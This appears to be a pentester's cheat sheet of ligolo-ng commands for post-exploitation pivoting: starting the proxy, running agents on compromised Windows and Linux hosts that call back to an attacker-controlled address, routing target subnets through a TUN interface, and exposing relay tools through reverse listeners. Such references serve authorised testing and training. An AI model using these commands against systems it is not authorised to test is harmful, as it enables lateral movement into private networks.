# Ligolo
> ligolo-ng reverse tunneling — TUN-based pivoting with no SOCKS/proxychains needed.

<!-- tags: pivoting, tunnel, ligolo, tun, route, listener, network, post -->

---

## start proxy server ligolo
Start the ligolo-ng proxy with a self-signed cert. Listens for agent callbacks on 11601.

```bash
sudo ligolo-proxy -selfcert
```

<!-- meta: risk=safe | phase=post | tags=ligolo,proxy,server -->

---

## run windows agent ligolo
Run the ligolo agent on a Windows pivot host, ignoring the proxy's self-signed cert.

```bash
.\agent.exe -ignore-cert -connect {{LHOST:ip}}:{{LPORT:port:11601}}
```

<!-- meta: risk=med | phase=post | tags=ligolo,agent,windows -->

---

## run linux agent ligolo
Same callback from a Linux pivot host, ignoring the proxy's self-signed cert.

```bash
./agent -ignore-cert -connect {{LHOST:ip}}:{{LPORT:port:11601}}
```

<!-- meta: risk=med | phase=post | tags=ligolo,agent,linux -->

---

## create tun interface ligolo
Create a user-owned TUN interface named `ligolo`. One-time setup before bringing it up.

```bash
sudo ip tuntap add user $USER mode tun ligolo
```

<!-- meta: risk=safe | phase=post | tags=ligolo,tun,setup -->

---

## bring tun up ligolo
Bring the ligolo TUN interface up. Required after creation and after reboots.

```bash
sudo ip link set ligolo up
```

<!-- meta: risk=safe | phase=post | tags=ligolo,tun,setup -->

---

## route subnet via tun ligolo
Route a target /24 through the ligolo tunnel so any tool on your box reaches it transparently.

```bash
sudo ip route add {{TARGET:ip}}/24 dev ligolo
```

<!-- meta: risk=safe | phase=post | tags=ligolo,route,subnet -->

---

## magic local route ligolo
Add the 240.0.0.1/32 magic route so the agent can reach loopback ports on your attacker box (ntlmrelayx, responder, etc.).

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

<!-- meta: risk=safe | phase=post | tags=ligolo,route,relay -->

---

## default reverse listener ligolo
Default reverse port-forward inside the ligolo session. Exposes attacker 11601 on the pivot's 0.0.0.0:11601.

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

<!-- meta: risk=med | phase=post | tags=ligolo,listener,reverse -->

---

## custom reverse listener ligolo
Custom reverse port-forward; pick the pivot bind port and the attacker-side destination.

```bash
listener_add --addr 0.0.0.0:{{RPORT:port:8888}} --to 127.0.0.1:{{LPORT:port:8888}}
```

<!-- meta: risk=med | phase=post | tags=ligolo,listener,reverse -->
